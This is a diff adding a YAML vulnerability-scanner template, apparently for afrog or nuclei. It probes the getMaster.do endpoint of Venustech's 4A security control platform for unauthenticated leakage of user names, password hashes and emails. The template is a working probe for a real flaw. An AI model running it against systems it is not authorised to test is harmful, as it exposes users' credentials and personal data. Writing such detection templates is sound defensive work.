@@ -1,0 +1,32 @@
+id: venustech-4a-gtmaster-disclosure
+
+info:
+  name: 启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏
+  author: zan8in
+  severity: high
+  description: |
+    启明星辰 4A统一安全管控平台 accountApi/getMaster.do 接口未授权即可返回用户中文名、密码哈希、认证类型和邮箱等敏感信息。
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+    - https://github.com/zan8in/afrog
+  tags: venustech,4a,disclosure,iam
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/accountApi/getMaster.do"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "cnname"
+          - "password"
+          - "cryptPwd"
+          - "authtype"
+          - "email"
+        condition: and
